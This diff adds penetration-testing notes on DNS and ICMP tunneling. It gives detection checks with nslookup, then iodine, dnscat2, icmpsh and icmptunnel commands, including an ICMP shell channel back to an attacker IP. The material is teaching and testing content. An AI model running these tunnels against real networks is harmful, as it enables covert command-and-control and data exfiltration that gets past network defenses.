@@ -66,6 +66,182 @@ Chisel can be downloaded here: [https://github.com/jpillora/chisel](https://gith
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
 ```
 
+## DNS Tunneling
+
+### Detection
+
+Can we resolve internal domain?
+
+```text
+nslookup acmebank.local
+Server:    192.168.1.1
+Address:  192.168.1.153
+
+Name:  acmebank.local
+Address: 192.168.10.12
+```
+
+Can we resolve an external domain through the company DNS server? \(if yes, we can perform DNS tunneling\)
+
+```text
+nslookup google.com
+Server:    192.168.1.1
+Address:  192.168.1.153
+
+Non-authoritative answer:
+Address: 216.58.209.14
+Name:  google.com
+```
+
+Can we communicate with external DNS? \(another finding\)
+
+```text
+nslookup pentest.blog 8.8.8.8
+Server: 8.8.8.8
+Address: 8.8.8.853
+
+Non-authoritative answer:
+Name: pentest.blog
+Address: 104.27.169.40
+Name: pentest.blog
+Address: 104.27.168.40
+```
+
+### Attack
+
+#### iodine
+
+iodine creates 2 tun adaptors and sends data between these 2 adapters by tunneling like a DNS query
+
+Server-Side:
+
+```text
+iodined -f -c -P <pass> <IP address> <domain> 
+eg: 
+iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
+```
+
+Client-Side:
+
+```text
+iodine -f -P <pass> <domain> r 
+eg: 
+iodine -f -P P@ssw0rd tunneldomain.com -r
+```
+
+#### dnscat2
+
+Server-Side:
+
+```text
+ruby ./dnscat2.rb tunneldomain.com
+```
+
+Client-Side:
+
+```text
+./dnscat2 tunneldomain.com
+```
+
+```text
+dnscat2> session -i 1
+command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80 
+```
+
+## ICMP Tunneling
+
+ICMP Tunneling can be done by changing the Payload Data so it will contain the data we want to send.
+
+### icmpsh
+
+It does not require administrative privileges. C2-channel, slave runs on Windows \(host\) and master runs on Kali \(attacker\)
+
+### Attack
+
+Clone or download icmpsh:
+
+```text
+git clone https://github.com/inquisb/icmpsh.git
+```
+
+Master - Kali:
+
+```text
+sysctl -w net.ipv4.icmp_echo_ignore_all=1 
+cd icmpsh
+./icmpsh_m.py <attacker’s-IP> <target-IP>
+```
+
+Slave - Windows
+
+```text
+icmpsh.exe -t <attacker’s-IP>
+```
+
+Master - Kali
+
+```text
+./icmpsh_m.py <attacker’s-IP> <target-IP>
+```
+
+We can use wireshark to see commands run in the data
+
+### icmptunnel
+
+Server-side:
+
+```text
+git clone https://github.com/jamesbarlow/icmptunnel.git 
+cd icmptunnel
+make
+```
+
+ICMP echo reply disable.
+
+```text
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+```
+
+ICMP tunnel run in server-side and set IP to tun0 adaptor
+
+```text
+./icmptunnel -s
+Ctrlz
+bg
+/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0 ifconfig
+```
+
+Client-side:
+
+```text
+git clone https://github.com/jamesbarlow/icmptunnel.git 
+cd icmptunnel
+make
+```
+
+ICMP echo reply disable.
+
+```text
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 
+./icmptunnel 192.168.1.108
+ctrl z
+/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
+```
+
+Connect to ssh using ICMP from server to client using tun interface
+
+```text
+ssh username@10.0.0.1
+```
+
+## References
+
+Most of the tunneling techniques covered here were extracted from here:
+
+{% embed url="https://github.com/areyou1or0/Tunneling" %}
+
+
+
 
 
 
